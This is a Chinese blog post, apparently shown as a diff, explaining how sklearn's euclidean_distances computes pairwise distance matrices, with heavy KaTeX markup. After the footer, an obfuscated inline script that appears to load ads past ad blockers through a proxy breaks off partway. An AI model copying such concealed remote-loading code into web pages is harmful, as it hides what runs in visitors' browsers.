class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.37105em"><span class=""></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65201em"><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎦</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎥</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎥</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15003em"><span class=""></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 4.80204em;vertical-align: -2.15003em"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65201em"><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎣</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎢</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎢</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15003em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15em"><span class=""></span></span></span></span></span><span class="arraycolsep" style="width: 0.5em"></span><span class="arraycolsep" style="width: 0.5em"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15em"><span class=""></span></span></span></span></span><span class="arraycolsep" style="width: 0.5em"></span><span class="arraycolsep" style="width: 0.5em"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15em"><span class=""></span></span></span></span></span><span class="arraycolsep" style="width: 0.5em"></span><span class="arraycolsep" style="width: 0.5em"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15em"><span class=""></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65201em"><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎦</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎥</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎥</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15003em"><span class=""></span></span></span></span></span></span></span></span></span></span></span></span></p> 
+<p>比如<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           1
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_1}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.13737em;vertical-align: -0.15em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>和<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           2
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_2}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.13737em;vertical-align: -0.15em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>之间的距离为dist(<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           1
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_1}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.13737em;vertical-align: -0.15em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>, <span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           2
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_2}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.13737em;vertical-align: -0.15em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>)，对应M的<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         m
+        
+        
+         12
+        
+       
+      
+      
+       m_{12}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.58056em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>以及<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         m
+        
+        
+         21
+        
+       
+      
+      
+       m_{21}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.58056em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>元素。</p> 
+<p>然而这个算法在提升了效率的同时也牺牲了准确度。官方文档指出了其不足之处：这个算法虽然是高效的，但不是最精确的，函数返回的距离矩阵很有可能不是完全对称的。</p> 
+<blockquote> 
+ <p>However, this is not the most precise way of doing this computation, because this equation potentially suffers from “catastrophic cancellation”. Also, the distance matrix returned by this function may not be exactly symmetric as required by, e.g., scipy.spatial.distance functions.</p> 
+</blockquote> 
+<p>参考scipy.spatial.distance.euclidean(u, v, w=None)，该函数计算两个1-D array u和v之间的欧式距离：<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          ∥
+         
+         
+          u
+         
+         
+          −
+         
+         
+          v
+         
+         
+          ∥
+         
+        
+        
+         2
+        
+       
+       
+        =
+       
+       
+        
+         
+          (
+         
+         
+          
+           
+            ∑
+           
+           
+          
+         
+         
+          (
+         
+         
+          
+           w
+          
+          
+           i
+          
+         
+         
+          
+           
+            ∣
+           
+           
+            
+             u
+            
+            
+             i
+            
+           
+           
+            −
+           
+           
+            
+             v
+            
+            
+             i
+            
+           
+           
+            ∣
+           
+          
+          
+           2
+          
+         
+         
+          )
+         
+         
+          )
+         
+        
+        
+         
+          1
+         
+         
+          /
+         
+         
+          2
+         
+        
+       
+      
+      
+       {parallel u-vparallel}_2={({textstylesum_{}}(w_ileft|u_i-v_iright|^2))}^{1/2}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.0497em;vertical-align: -0.2997em"></span><span class="mord"><span class="mord"><span class="mrel">∥</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mord mathdefault">u</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.03588em">v</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">∥</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151408em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2997em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.53162em;vertical-align: -0.29971em"></span><span class="mord"><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.29971em"><span class=""></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02691em">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02691em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner"><span class="minner"><span class="mopen delimcenter">∣</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose delimcenter">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.954008em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 1.23191em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">/</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span>，其中w指u和v之间的权重，默认<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         w
+        
+        
+         i
+        
+       
+      
+      
+       w_i
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.58056em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.02691em">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.02691em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>为1.0。</p> 
+<p> </p> 
+<p>参考：scikit-learn 1.1.3版本<br> （1）sklearn.neighbors.NearestNeighbors, <a href="https://scikit-learn.org/stable/modules/generated/sklearn.neighbors.NearestNeighbors.html?highlight=nearestneighbors#sklearn.neighbors.NearestNeighbors">https://scikit-learn.org/stable/modules/generated/sklearn.neighbors.NearestNeighbors.html?highlight=nearestneighbors#sklearn.neighbors.NearestNeighbors</a><br> （2）sklearn.metrics.pairwise.euclidean_distances, <a href="https://scikit-learn.org/stable/modules/generated/sklearn.metrics.pairwise.euclidean_distances.html#sklearn.metrics.pairwise.euclidean_distances">https://scikit-learn.org/stable/modules/generated/sklearn.metrics.pairwise.euclidean_distances.html#sklearn.metrics.pairwise.euclidean_distances</a><br> （3）sklearn.cluster.DBSCAN, <a href="https://scikit-learn.org/stable/modules/generated/sklearn.cluster.DBSCAN.html#sklearn.cluster.DBSCAN">https://scikit-learn.org/stable/modules/generated/sklearn.cluster.DBSCAN.html#sklearn.cluster.DBSCAN</a>）<br> （4）scipy.spatial.distance.euclidean, <a href="https://docs.scipy.org/doc/scipy/reference/generated/scipy.spatial.distance.euclidean.html#scipy.spatial.distance.euclidean">https://docs.scipy.org/doc/scipy/reference/generated/scipy.spatial.distance.euclidean.html#scipy.spatial.distance.euclidean</a></p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var 